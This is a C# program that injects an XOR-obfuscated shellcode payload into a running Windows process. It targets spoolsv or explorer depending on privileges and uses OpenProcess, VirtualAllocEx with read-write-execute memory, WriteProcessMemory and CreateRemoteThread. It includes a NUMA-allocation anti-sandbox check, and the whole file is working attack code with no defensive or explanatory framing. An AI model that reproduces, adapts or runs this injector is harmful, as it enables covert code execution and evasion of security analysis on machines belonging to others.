using System; // Basic system functionalities
using System.Diagnostics; // Enables interaction with processes
using System.Runtime.InteropServices; // Required for P/Invoke methods
using System.Security.Principal; // For checking user privileges

namespace RemoteInjection // Updated namespace to indicate injection functionality
{
    public class Program
    {
        // Enum to define process access rights
        [Flags]
        public enum ProcessAccessRights : uint
        {
            AllAccess = 0x001F0FFF // Grant full access to the process
        }

        // Enum to define memory allocation types
        [Flags]
        public enum MemoryAllocationType
        {
            Commit = 0x1000, // Commit memory
            Reserve = 0x2000 // Reserve memory
        }

        // Enum to define memory protection options
        [Flags]
        public enum MemoryProtectionType
        {
            ExecuteReadWrite = 0x40 // Memory can be executed, read, and written
        }

        // Open a handle to a process
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessRights accessRights, bool inheritHandle, int processId);

        // Allocate memory in a remote process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint size, MemoryAllocationType allocationType, MemoryProtectionType protectionType);

        // Write data into the memory of a remote process
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] buffer, int size, out IntPtr bytesWritten);

        // Create a thread in a remote process
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr threadAttributes, uint stackSize, IntPtr startAddress, IntPtr parameter, uint creationFlags, IntPtr threadId);

        // Allocate memory in a NUMA node
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint size, uint allocationType, uint protectionType, uint preferredNode);

        // Get a handle to the current process
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // Check if the process has elevated privileges
        static bool HasElevatedPrivileges
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // Anti-sandbox check using NUMA memory allocation
            IntPtr allocatedMemory = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (allocatedMemory == IntPtr.Zero)
            {
                Console.WriteLine("Memory allocation failed. Exiting...");
                return;
            }

            // XOR-encoded shellcode payload
            byte[] payload = new byte[511] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0xbe,
0x71, 0xba, 0xda, 0x71, 0xb2, 0xe2, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xbb, 0xa2, 0xa4, 0xa3, 0xb2, 0xfb, 0x2a, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x41, 0x3a, 0x52, 0xa7, 0x7a, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
0x2f};

            int payloadLength = payload.Length;

            // Determine target process based on input arguments or privilege level
            string targetProcess = args.Length == 1 ? args[0] : HasElevatedPrivileges ? "spoolsv" : "explorer";
            Console.WriteLine($"Targeting process: {targetProcess}");

            // Get all processes matching the target name
            Process[] processes = Process.GetProcessesByName(targetProcess);

            // Iterate through matching processes
            foreach (var process in processes)
            {
                int processId = process.Id;

                // Obtain a handle to the process
                IntPtr processHandle = OpenProcess(ProcessAccessRights.AllAccess, false, processId);
                if (processHandle == IntPtr.Zero)
                {
                    Console.WriteLine($"Failed to get handle for process ID: {processId}");
                    continue;
                }
                Console.WriteLine($"Successfully obtained handle: {processHandle} for process ID: {processId}");

                // Allocate memory in the remote process
                IntPtr remoteMemoryAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)payloadLength, MemoryAllocationType.Commit | MemoryAllocationType.Reserve, MemoryProtectionType.ExecuteReadWrite);
                Console.WriteLine($"Allocated memory at address: {remoteMemoryAddress} in target process");

                // Decode the payload
                for (int i = 0; i < payload.Length; i++)
                {
                    payload[i] ^= 0xFA; // XOR decryption
                }

                // Write the payload into the allocated memory
                if (WriteProcessMemory(processHandle, remoteMemoryAddress, payload, payloadLength, out IntPtr bytesWritten))
                {
                    Console.WriteLine($"Successfully wrote {bytesWritten} bytes to process memory");
                }
                else
                {
                    Console.WriteLine("Failed to write payload to process memory");
                    continue;
                }

                // Create a remote thread to execute the payload
                IntPtr remoteThreadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, remoteMemoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Remote thread created at: {remoteThreadHandle}");
                break; // Stop after successfully injecting into one process
            }
        }
    }
}
